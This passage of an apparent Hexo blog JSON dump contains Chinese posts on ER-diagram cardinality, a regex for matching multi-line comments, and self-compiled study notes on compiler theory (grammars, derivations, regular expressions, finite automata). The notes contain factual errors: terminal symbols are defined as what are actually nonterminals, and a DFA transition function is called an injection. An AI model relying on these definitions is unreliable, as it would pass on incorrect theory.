class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>连线的基数为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>1..1</mn></mrow><annotation encoding=\"application/x-tex\">1..1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">1</span></span></span></span>，这意味着<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>表中每一个学生实例都必须在联系中出现一次，也就是说每个学生都必须有且仅有一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>。而左边的<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>0..</mn><mo>∗</mo></mrow><annotation encoding=\"application/x-tex\">0..*</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">∗</span></span></span></span>意味着一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>可以对应于零个或多个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>。因此这张图表示的是一个<strong>one-to-many</strong>关系，这很容易和上面的传统表示方法混淆。</p>\n<p>实际上，带有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>m</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">m..n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">m</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">n</span></span></span></span>的联系表示方法涵盖的信息已经包括了传统表示方法能涵盖的所有信息。而这种表示方法和<strong>crow’s foot</strong>表示方法相比，当表示的信息相同时，<strong>联系左右的表示是相反的</strong>。</p>\n"},{"title":"用正则表达式匹配多行注释","date":"2020-10-29T01:55:36.000Z","top_img":false,"cover":"/img/cover.jpg","_content":"\n在写编译原理词法分析大作业的时候，一个比较棘手的问题就是**如何匹配多行注释**。\n\n多行注释由`/*`开始，`*/`结尾，中间除了不能出现`*/`字符串以外，任何字符串都能出现。问题就聚焦到了如何写一个正则去匹配**不包含`*/`的字符串**。\n\n和室友想了好几天，最后写出来了，我自以为比较有挑战性，也很有技巧性。\n\n```regex\n\\/\\*[\\/]*([^\\*\\/][\\/]*|\\*|[^\\*\\/])*\\*\\/\n```\n\n感觉可以拓展到**匹配任意不包含字符串`str`**，有空再想。","source":"_posts/用正则表达式匹配多行注释.md","raw":"---\ntitle: 用正则表达式匹配多行注释\ndate: 2020-10-29 09:55:36\ntags:\n- 正则表达式\n- 编译原理\ntop_img: false\ncover: /img/cover.jpg\n---\n\n在写编译原理词法分析大作业的时候，一个比较棘手的问题就是**如何匹配多行注释**。\n\n多行注释由`/*`开始，`*/`结尾，中间除了不能出现`*/`字符串以外，任何字符串都能出现。问题就聚焦到了如何写一个正则去匹配**不包含`*/`的字符串**。\n\n和室友想了好几天，最后写出来了，我自以为比较有挑战性，也很有技巧性。\n\n```regex\n\\/\\*[\\/]*([^\\*\\/][\\/]*|\\*|[^\\*\\/])*\\*\\/\n```\n\n感觉可以拓展到**匹配任意不包含字符串`str`**，有空再想。","slug":"用正则表达式匹配多行注释","published":1,"updated":"2020-11-04T06:33:42.020Z","_id":"ckiszi5ak000j98wa23sa3e4p","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在写编译原理词法分析大作业的时候，一个比较棘手的问题就是<strong>如何匹配多行注释</strong>。</p>\n<p>多行注释由<code>/*</code>开始，<code>*/</code>结尾，中间除了不能出现<code>*/</code>字符串以外，任何字符串都能出现。问题就聚焦到了如何写一个正则去匹配<strong>不包含<code>*/</code>的字符串</strong>。</p>\n<p>和室友想了好几天，最后写出来了，我自以为比较有挑战性，也很有技巧性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\&#x2F;\\*[\\&#x2F;]*([^\\*\\&#x2F;][\\&#x2F;]*|\\*|[^\\*\\&#x2F;])*\\*\\&#x2F;</span><br></pre></td></tr></table></figure>\n<p>感觉可以拓展到<strong>匹配任意不包含字符串<code>str</code></strong>，有空再想。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在写编译原理词法分析大作业的时候，一个比较棘手的问题就是<strong>如何匹配多行注释</strong>。</p>\n<p>多行注释由<code>/*</code>开始，<code>*/</code>结尾，中间除了不能出现<code>*/</code>字符串以外，任何字符串都能出现。问题就聚焦到了如何写一个正则去匹配<strong>不包含<code>*/</code>的字符串</strong>。</p>\n<p>和室友想了好几天，最后写出来了，我自以为比较有挑战性，也很有技巧性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\&#x2F;\\*[\\&#x2F;]*([^\\*\\&#x2F;][\\&#x2F;]*|\\*|[^\\*\\&#x2F;])*\\*\\&#x2F;</span><br></pre></td></tr></table></figure>\n<p>感觉可以拓展到<strong>匹配任意不包含字符串<code>str</code></strong>，有空再想。</p>\n"},{"title":"编译原理知识点自整理","date":"2020-10-29T09:04:11.000Z","top_img":false,"cover":"/img/compiler.jpg","katex":true,"_content":"\n## 文法和语言\n\n### 字母表和符号串\n1. 字母表是非空元素的**集合**。用$\\Sigma$表示\n2. 字母表中的元素称为**符号**或者**字符**。\n3. 符号所形成的有穷有序序列称为**符号串**。\n4. $\\epsilon$记为空符号串。\n\n$$\nx=y\n$$\n\n### 符号串的形式运算\n1. 若$x$和$y$是符号串，则$xy$记为把$y$写在$x$后面形成的符号串。\n2. **符号串的集合**的乘积定义为集合的笛卡儿积。\n3. 符号串整数幂运算定义为多次乘积。特别地，$x^{0}=\\epsilon$。\n4. 符号串集合的幂运算定义为多次笛卡儿积。特别地，$A^{0}=\\left\\{\\epsilon\\right\\}$。\n5. 符号串集合$a$的闭包定义为\n\n$$\nA^{+}=A^{1}\\cup A^{2} \\cup ...\\\\\nA^{*}=A^{0}\\cup A^{1} \\cup ...\n$$\n\n### 形式语言\n1. 符号串的集合是形式语言。\n2. 形式语言不考虑语义。\n3. 当语言是有穷集合时，用枚举方法表示。\n4. 当语言是无穷集合时，用**文法**表示语言。\n\n### 文法\n#### 文法的规则\n1. 产生式（规则）是一个符号与一个符号串形成的有序对。写作$A\\rightarrow\\beta$。意为左部符号用右部的符号串定义。\n2. 一组规则规定了一个语言的语法结构。\n3. 符号分两类：terminal符号和nonterminal符号。terminal符号定义为出现在规则左部、能派生出符号或者符号串的符号。\n\n#### 文法\n文法是规则的非空有穷集合，表示为四元组$G=\\left(V_{N},V_{T},P,S\\right)$。\n其中$V_{N}$是nonterminal符号，$V_{T}$是terminal符号，$P$是规则集合，$S$是文法的开始符号。\n\n### 语言\n#### 推导\n##### 直接推导\n令$G$是一个文法。\n\n仅当$A\\rightarrow\\alpha$是$G$的一个规则且$x,y \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$时，我们可以说：$xAy\\Rightarrow x\\alpha y$。即，从左直接推导到右，仅使用一次规则。\n\n#### 推导的定义\n若存在一个直接推导序列：\n$$\n\\alpha_{0}\\Rightarrow \\alpha_{1}\\Rightarrow \\alpha_{2}\\Rightarrow ... \\alpha_{n}\n$$\n则说这个序列是从$\\alpha_{0}$到$\\alpha_{n}$、长度为$n$的推导，记之为：$\\alpha_{0} \\stackrel{+}{\\Rightarrow} \\alpha_{n}$。长度大于等于1。\n\n#### 广义推导\n广义推导记为$\\alpha_{0} \\stackrel{*}{\\Rightarrow} \\alpha_{n}$。与之前的推导相比，多了一个**推出自己**的行为。长度大于等于0。\n\n#### 句型\n设有文法$G\\left[S\\right]$，若$S \\stackrel{*}{\\Rightarrow}x$，且$x \\in (V_{N}\\cup V_{T})^{*}$时，称符号串$x$为文法的**句型**。\n\n#### 句子\n设有文法$G\\left[S\\right]$，若$S \\stackrel{*}{\\Rightarrow}x$，且$x \\in  V_{T}^{*}$时，称符号串$x$为文法的**句子**。\n\n#### 语言\n文法$G\\left[S\\right]$所产生的所有**句子**的集合称为文法定义的**语言**，记为$L\\left(G\\left[S\\right]\\right)$\n\n1. 文法给定后，语言就确定了。\n2. $L\\left(G\\left[S\\right]\\right)$是$V_{T}^{*}$的**子集**。\n\n### 规范推导和规范规约\n很明显，同一个句子、句型是可以通过不同的推导序列推导出的，因为可以选择不同的nonterminal次序。\n\n最左（最右）推导：推导序列中每一步直接推导都是对左部中最左（最右）的nonterminal进行替换。\n\n最右推导也叫**规范推导**，用规范推导推导出的句型称为**规范句型**。\n\n规范推导的逆过程，被称为**最左规约**，也叫做**规范规约**。\n\n### 规则递归\n在规则的左部和右部具有相同的nonterminal时，称为递归规则。\n\n- 若有$A\\rightarrow A...$，称为规则左递归。\n- 若有$A\\rightarrow ...A$，称为规则右递归。\n- 若有$A\\rightarrow ...A...$，称为规则递归。\n\n### 文法递归\n对于文法，若存在一个nonterminal和一个推导，和规则递归相似时，称为文法递归。\n\n- 若有$A\\Rightarrow A...$，称为文法左递归。\n- 若有$A\\Rightarrow ...A$，称为文法右递归。\n- 若有$A\\Rightarrow ...A...$，称为文法递归。\n\n### 短语、直接短语\n\n令$G$是一个文法，$S$是文法的开始符号，而$\\alpha \\beta \\sigma$是其一个句型。如果有：\n$$\nS \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\stackrel{+}{\\Rightarrow} \\beta\n$$\n则称：$\\beta$是**相对于nonterminal $A$**的**句型$\\alpha \\beta \\sigma$**的短语。\n\n特别地，如果$S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\Rightarrow \\beta$，则称为**直接短语**。\n\n### 句柄\n一个句型的**最左直接短语**称为该句型的**句柄**。\n1. 句柄是直接短语，由于推导左部是nonterminal，所以句柄不仅在直接推导右部，也在一则规则右部。\n2. 最左。\n\n### 语法树\n#### 语法树的生成\n语法树是句型的推导过程的一种**图形表示**。设存在文法$G=\\left(V_{N},V_{T},P,S\\right)$，对其任何句型都能构造满足下列要求的语法树。\n1. 每个结点都有一个标记，标记是$ V_{N}\\cup V_{T}\\cup\\left\\{\\epsilon\\right\\} $中的一个符号。\n2. root结点的标记是开始符号$S$。\n3. 若某一个结点至少有一个子结点，则其标记一定是**nonterminal**。\n4. 若某个结点$A$有$k$个子结点，其标记分别为$A_{1},...,A_{k}$，则一定存在规则$A \\rightarrow A_{i}, i=1...k$。\n\n#### 子树和简单子树\n由于即使是同一课语法树，也有可能对应于多种不同的推导过程。而引入子树和简单子树，则是为了找到**句型短语和句柄**。\n##### 子树\n任一非root结点和其所有结点的分支就是子树。\n\n##### 简单子树\n只具有**单层分支**的子树称为简单子树。\n\n1. 对于该语法树对应的**句型**，子树的末端结点形成的符号串是**相对于子树root的短语**。\n2. 简单子树的末端结点形成的符号串是相对于简单子树root的**直接短语**。\n3. 最左简单子树的末端结点形成的符号串是**句柄**。\n\n### 文法的二义性\n当存在不同的最左（最右）推导时，产生的语法树也不同。\n\n文法的句型是否只对迎着唯一的一颗语法树？\n是否只有唯一的最左（最右）推导？\n\n若某个句子对应两颗不同的语法树，则说该文法是**二义性**的。\n#### 二义性的消除\n1. 不改变语法规则，加一些语法的非形式规定。比如运算符的优先级。\n2. 构造一个等价的无二义性的文法。\n\n**不存在一个算法，能在有限的步骤内判定一个文法是否为二义性的。**\n\n### 文法和语言的分类\n假设存在文法$G=\\left(V_{N},V_{T},P,S\\right)$。\n#### 0型文法（无限制文法）\n若文法中每条规则$\\alpha \\rightarrow \\beta$都满足下列要求：\n1. $\\alpha \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$且至少包含一个nonterminal。\n2. $\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n\n则该文法是0型文法，其描述的语言为0型语言。\n\n0型语言又称为无限制性语言。\n\n#### 1型文法（上下文有关文法）\n若文法中每条规则的形式为：$\\alpha A \\beta \\rightarrow \\alpha u \\beta$，满足：\n1. $\\alpha,\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n2. $u \\in \\left(V_{N} \\cup V_{T}\\right)^{+}$。\n\n则该文法是1型文法，其描述的语言为1型语言。\n\n因为在利用规则将$A$替换为$u$时，必须考虑其上下文环境（$\\alpha, \\beta$），且不允许替换为空字符串，因此也成为**上下文有关文法**。\n\n#### 2型文法（上下文无关文法）\n若文法中每一条规则的形式为$A \\rightarrow \\beta$，且满足：\n1. $A \\in V_{N}$。\n2. $\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n\n编译原理课程所主要研究对象为上下文无关文法。\n\n#### 3型文法（正规文法）\n- 若每条规则的形式为$A\\rightarrow \\alpha B$或者$A \\rightarrow \\alpha$，其中$A,B \\in V_{N}, \\alpha \\in V_{T}^{*}$，则称其为**右线性文法**。\n- 若每条规则的形式为$A\\rightarrow B \\alpha$或者$A \\rightarrow \\alpha$，其中$A,B \\in V_{N}, \\alpha \\in V_{T}^{*}$，则称其为**左线性文法**。\n\n左、右线性文法都被称为3型文法、正规文法，其语言为正规语言。\n\n从0型文法到3型文法，对规则的限制逐渐增加，每一种文法都是前一种文法的**子文法**。\n\n## 词法分析和有穷自动机\n\n### 词法分析程序\n词法分析程序是语法分析程序的一个子程序（子类），每当语法分析程序需要一个单词符号时，就调用词法分析程序的API，让词法分析程序从输入的String中，识别出一个具有独立意义的token。\n\n### Token\n\n#### token简介\n词法分析程序的输入是String形式的**source program**，输出tokens。这样的过程叫做tokenization。\n\ntoken是语言中具有独立意义的最小语法单位。一般分为5种：\n\n1. keyword\t比如：if, else, while, do等\n2. identifier\t比如：对象名、函数名等\n3. constant\t包括stringConstant、intConstant、floatConstant和boolConstant\n4. operator\t包括加减乘除等\n5. punctuator\t包括分号，逗号，括号等\n\n####  输出token的形式\n以以下形式输出token：\n$$\n\\left(tokenType,\\ tokenValue\\right)\n$$\n1. 每一个tokenType对应一个整数编码。\n2. 当一个tokenType里只含有一种value时，该整数编码就完全代表了value，因此value可以省略。\n\n#### token的两种定义\n\n##### 正规文法（左线型文法或者右线性文法）\n正规文法定义token易于识别，以identifier举例：\n$$\n<identifier> \\rightarrow l|<identifier>l|<identifier>d \\\\\nl:\\ a\\sim z \\  or\\  A \\sim Z\\\\\nd:\\ 0\\sim 9\n$$\n\n##### 正规式 regular expression\n设存在字母表$\\Sigma = \\left \\{a_{1}, a_{2},...,a_{n}\\right\\}$，在其上的正规式与正规式表示的正规集用以下（递归）规则定义：\n\n1. $\\varnothing$是$\\Sigma$上的正规式，表示的正规集也是$\\varnothing$。\n2. $\\epsilon$是$\\Sigma$上的正规式，表示的正规集是$\\left\\{\\epsilon\\right\\}$。\n3. $a_{i}$是$\\Sigma$上的正规式，表示的正规集是$\\left\\{a_{i}\\right\\}$。\n4. 若$e_{1}$和$e_{2}$都是$\\Sigma$上的正规式，所表示的正规集为$L\\left(e_{1}\\right)$和$L\\left(e_{2}\\right)$，那么\n\t1. $e_{1}|e_{2}$也是正规式，$L\\left(e_{1}|e_{2}\\right)=L\\left(e_{1}\\right) \\cup L\\left(e_{2}\\right)$。\n\t2. $e_{1}e_{2}$也是正规式，$L\\left(e_{1}e_{2}\\right)=L\\left(e_{1}\\right)  L\\left(e_{2}\\right)$。\n\t3. $\\left(e_{1}\\right)^{*}$也是正规式，$L\\left(\\left(e_{1}\\right)^{*}\\right)=\\left(L\\left(e_{1}\\right)\\right)^{*}$。\n\n##### 正规式的一些性质\n1. $|$运算的交换律\t$A|B=B|A$\n2. $|$运算的结合律\t$A|\\left(B|C\\right)=\\left(A|B\\right)|C$\n3. $\\cdot$运算的结合律\t$A\\left(BC\\right)=\\left(AB\\right)C$\n4. 分配律\t$A\\left(B|C\\right)=AB|AC$\n5. $A\\epsilon|\\epsilon A=A$\n6. $\\left(A^{*}\\right)^{*}=A^{*}$\n\n#### 正规文法与正规式的相互转换\n\n##### 正规文法转正规式\n1. 将正规文法中的每个nonterminal表示成关于它的正规式方程，获得一个**联立方程组**。\n2. 终结规则：\n$$\nif\\ \\  x=\\alpha x|\\beta,\\ x=\\alpha^{*}\\beta \\\\\nif\\ \\  x=x\\alpha|\\beta,\\ x=\\beta\\alpha^{*}\n$$\n3. 用终结规则、分配律、交换律和结合律求解即可。\n\n一个（不太）简单的例子\n$$\n正规文法\\ G：\\\\\nZ\\rightarrow 0A\\\\\nA\\rightarrow 0A|0B \\\\\nB\\rightarrow 1A|\\epsilon\n$$\n由第三式和第二式，有\n$$\nA=0A|01A|0 \\\\\nA=(0|01)A|0\n$$\n所以\n$$\nA=(0|01)^{*}0 \\\\\nZ=0(0|01)^{*}0\n$$\n\n##### 正规式转换正规文法\n假设存在字母表$\\Sigma$和正规式，需要转换为正规文法$G=\\left(V_{N},V_{T},P,S\\right)$。\n\n1. $V_{T}=\\Sigma$。\n2. 对原始正规式$R$选择一个nonterminal $Z$，生成规则$Z\\rightarrow R$，令$S=Z$。\n3. 若存在形如$A\\rightarrow ab$的规则，转换为$A\\rightarrow \\alpha B$和$B\\rightarrow b$。\n4. 若存在形如$A\\rightarrow a^{*}b$的规则，转换为$A \\rightarrow aA|b$。\n5. 重复3和4，直到没得转换。\n\n### 有穷自动机\n有穷自动机是具有**离散输入**和**输出系统**的一种抽象数学模型，分为确定有穷自动机和非确定有穷自动机，两者都能准确识别正规集。\n\n#### 确定有穷自动机 DFA\n一个DFA是一个五元组$M=\\left(Q,\\Sigma,f,S,Z\\right)$，其中\n1. $Q$是一个有穷状态集合，集合中每一个元素是一个**状态**；\n2. $\\Sigma$是一个有穷输入字母表，表中每个元素称为一个**输入字符**；\n3. $f$是一个$Q \\times \\Sigma$到$Q$的单射，即$\\left(q_{i},a\\right)\\stackrel{f}{\\rightarrow} q_{j}，其中q_{i},q_{j} \\in Q,a \\in \\Sigma$；\n4. $S \\in Q$是唯一的一个初态；\n5. $Z \\subseteq Q$是终态集合。\n\n当前状态为$q_{i}$、输入字符为$a$时，自动机就转换到下一个状态$q_{j}$。此时$q_{j}$称为$q_{i}$的一个后继状态。\n\n单射的意义：任意一个状态与输入的二元组都**唯一**确定了下一个状态。\n\n一个DFA可以用一个矩阵表示，也可以用图表示。\n\n- 用矩阵表示时，行表示状态，列表示输入符号，矩阵元素表示$f\\left(q,a\\right)$\n- 用图表示时，假设有m个状态和n个输入字符，则图含有m个状态结，每个状态结**最多**有n条**箭弧**与别的状态结连接。整个图含有**唯一**一个初态结和多个终态结。\n- 对于$\\Sigma^{*}$中的任意符号串$\\beta$，若存在一条路从初态结到终态结，且这条路上所有的符号连成的符号串等于$\\beta$，则称：**$\\beta$被DFA $M$所识别**。\n- 若$M$的初态结也是终态结，那么$\\epsilon$也可以被识别。\n- DFA $M$可识别的符号串的全体记为$L\\left(M\\right)$。\n\n#### 非确定有穷自动机 NFA\n一个NFA也是一个五元组$M=\\left(Q,\\Sigma,f,S,Z\\right)$，其中\n1. $Q,\\Sigma,Z$与DFA中相同；\n2. $f$不再是单射，而是一个**多值**函数，映射出一个集合；\n3. $f\\left(q_{i},a\\right)=\\left\\{某些状态的集合\\right\\}$；\n4. $S \\subset Q$是**非空初态集**。\n\n- NFA允许状态图中，边的标记为$\\epsilon$。\n- ","source":"_posts/编译原理知识点自整理.md","raw":"---\ntitle: 编译原理知识点自整理\ndate: 2020-10-29 17:04:11\ntags:\n- 编译原理\n- flex-bison\ntop_img: false\ncover: /img/compiler.jpg\nkatex: true\n---\n\n## 文法和语言\n\n### 字母表和符号串\n1. 字母表是非空元素的**集合**。用$\\Sigma$表示\n2. 字母表中的元素称为**符号**或者**字符**。\n3. 符号所形成的有穷有序序列称为**符号串**。\n4. $\\epsilon$记为空符号串。\n\n$$\nx=y\n$$\n\n### 符号串的形式运算\n1. 若$x$和$y$是符号串，则$xy$记为把$y$写在$x$后面形成的符号串。\n2. **符号串的集合**的乘积定义为集合的笛卡儿积。\n3. 符号串整数幂运算定义为多次乘积。特别地，$x^{0}=\\epsilon$。\n4. 符号串集合的幂运算定义为多次笛卡儿积。特别地，$A^{0}=\\left\\{\\epsilon\\right\\}$。\n5. 符号串集合$a$的闭包定义为\n\n$$\nA^{+}=A^{1}\\cup A^{2} \\cup ...\\\\\nA^{*}=A^{0}\\cup A^{1} \\cup ...\n$$\n\n### 形式语言\n1. 符号串的集合是形式语言。\n2. 形式语言不考虑语义。\n3. 当语言是有穷集合时，用枚举方法表示。\n4. 当语言是无穷集合时，用**文法**表示语言。\n\n### 文法\n#### 文法的规则\n1. 产生式（规则）是一个符号与一个符号串形成的有序对。写作$A\\rightarrow\\beta$。意为左部符号用右部的符号串定义。\n2. 一组规则规定了一个语言的语法结构。\n3. 符号分两类：terminal符号和nonterminal符号。terminal符号定义为出现在规则左部、能派生出符号或者符号串的符号。\n\n#### 文法\n文法是规则的非空有穷集合，表示为四元组$G=\\left(V_{N},V_{T},P,S\\right)$。\n其中$V_{N}$是nonterminal符号，$V_{T}$是terminal符号，$P$是规则集合，$S$是文法的开始符号。\n\n### 语言\n#### 推导\n##### 直接推导\n令$G$是一个文法。\n\n仅当$A\\rightarrow\\alpha$是$G$的一个规则且$x,y \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$时，我们可以说：$xAy\\Rightarrow x\\alpha y$。即，从左直接推导到右，仅使用一次规则。\n\n#### 推导的定义\n若存在一个直接推导序列：\n$$\n\\alpha_{0}\\Rightarrow \\alpha_{1}\\Rightarrow \\alpha_{2}\\Rightarrow ... \\alpha_{n}\n$$\n则说这个序列是从$\\alpha_{0}$到$\\alpha_{n}$、长度为$n$的推导，记之为：$\\alpha_{0} \\stackrel{+}{\\Rightarrow} \\alpha_{n}$。长度大于等于1。\n\n#### 广义推导\n广义推导记为$\\alpha_{0} \\stackrel{*}{\\Rightarrow} \\alpha_{n}$。与之前的推导相比，多了一个**推出自己**的行为。长度大于等于0。\n\n#### 句型\n设有文法$G\\left[S\\right]$，若$S \\stackrel{*}{\\Rightarrow}x$，且$x \\in (V_{N}\\cup V_{T})^{*}$时，称符号串$x$为文法的**句型**。\n\n#### 句子\n设有文法$G\\left[S\\right]$，若$S \\stackrel{*}{\\Rightarrow}x$，且$x \\in  V_{T}^{*}$时，称符号串$x$为文法的**句子**。\n\n#### 语言\n文法$G\\left[S\\right]$所产生的所有**句子**的集合称为文法定义的**语言**，记为$L\\left(G\\left[S\\right]\\right)$\n\n1. 文法给定后，语言就确定了。\n2. $L\\left(G\\left[S\\right]\\right)$是$V_{T}^{*}$的**子集**。\n\n### 规范推导和规范规约\n很明显，同一个句子、句型是可以通过不同的推导序列推导出的，因为可以选择不同的nonterminal次序。\n\n最左（最右）推导：推导序列中每一步直接推导都是对左部中最左（最右）的nonterminal进行替换。\n\n最右推导也叫**规范推导**，用规范推导推导出的句型称为**规范句型**。\n\n规范推导的逆过程，被称为**最左规约**，也叫做**规范规约**。\n\n### 规则递归\n在规则的左部和右部具有相同的nonterminal时，称为递归规则。\n\n- 若有$A\\rightarrow A...$，称为规则左递归。\n- 若有$A\\rightarrow ...A$，称为规则右递归。\n- 若有$A\\rightarrow ...A...$，称为规则递归。\n\n### 文法递归\n对于文法，若存在一个nonterminal和一个推导，和规则递归相似时，称为文法递归。\n\n- 若有$A\\Rightarrow A...$，称为文法左递归。\n- 若有$A\\Rightarrow ...A$，称为文法右递归。\n- 若有$A\\Rightarrow ...A...$，称为文法递归。\n\n### 短语、直接短语\n\n令$G$是一个文法，$S$是文法的开始符号，而$\\alpha \\beta \\sigma$是其一个句型。如果有：\n$$\nS \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\stackrel{+}{\\Rightarrow} \\beta\n$$\n则称：$\\beta$是**相对于nonterminal $A$**的**句型$\\alpha \\beta \\sigma$**的短语。\n\n特别地，如果$S \\stackrel{*}{\\Rightarrow}\\alpha \\beta \\sigma且A\\Rightarrow \\beta$，则称为**直接短语**。\n\n### 句柄\n一个句型的**最左直接短语**称为该句型的**句柄**。\n1. 句柄是直接短语，由于推导左部是nonterminal，所以句柄不仅在直接推导右部，也在一则规则右部。\n2. 最左。\n\n### 语法树\n#### 语法树的生成\n语法树是句型的推导过程的一种**图形表示**。设存在文法$G=\\left(V_{N},V_{T},P,S\\right)$，对其任何句型都能构造满足下列要求的语法树。\n1. 每个结点都有一个标记，标记是$ V_{N}\\cup V_{T}\\cup\\left\\{\\epsilon\\right\\} $中的一个符号。\n2. root结点的标记是开始符号$S$。\n3. 若某一个结点至少有一个子结点，则其标记一定是**nonterminal**。\n4. 若某个结点$A$有$k$个子结点，其标记分别为$A_{1},...,A_{k}$，则一定存在规则$A \\rightarrow A_{i}, i=1...k$。\n\n#### 子树和简单子树\n由于即使是同一课语法树，也有可能对应于多种不同的推导过程。而引入子树和简单子树，则是为了找到**句型短语和句柄**。\n##### 子树\n任一非root结点和其所有结点的分支就是子树。\n\n##### 简单子树\n只具有**单层分支**的子树称为简单子树。\n\n1. 对于该语法树对应的**句型**，子树的末端结点形成的符号串是**相对于子树root的短语**。\n2. 简单子树的末端结点形成的符号串是相对于简单子树root的**直接短语**。\n3. 最左简单子树的末端结点形成的符号串是**句柄**。\n\n### 文法的二义性\n当存在不同的最左（最右）推导时，产生的语法树也不同。\n\n文法的句型是否只对迎着唯一的一颗语法树？\n是否只有唯一的最左（最右）推导？\n\n若某个句子对应两颗不同的语法树，则说该文法是**二义性**的。\n#### 二义性的消除\n1. 不改变语法规则，加一些语法的非形式规定。比如运算符的优先级。\n2. 构造一个等价的无二义性的文法。\n\n**不存在一个算法，能在有限的步骤内判定一个文法是否为二义性的。**\n\n### 文法和语言的分类\n假设存在文法$G=\\left(V_{N},V_{T},P,S\\right)$。\n#### 0型文法（无限制文法）\n若文法中每条规则$\\alpha \\rightarrow \\beta$都满足下列要求：\n1. $\\alpha \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$且至少包含一个nonterminal。\n2. $\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n\n则该文法是0型文法，其描述的语言为0型语言。\n\n0型语言又称为无限制性语言。\n\n#### 1型文法（上下文有关文法）\n若文法中每条规则的形式为：$\\alpha A \\beta \\rightarrow \\alpha u \\beta$，满足：\n1. $\\alpha,\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}$。\n2. $u \\in \\left(V_{N} \\cup V_{T}\\right)^{+}$。\n\n则该文法是1型文法，其描述的语言为1型语言。\n\n因为在利用规则将$A$替换为$u$时，必须考虑其上下文环境（$\\alpha, \\beta$），且不允许替换为空字符串，因此也成为**上下文有关文法**。\n\n#### 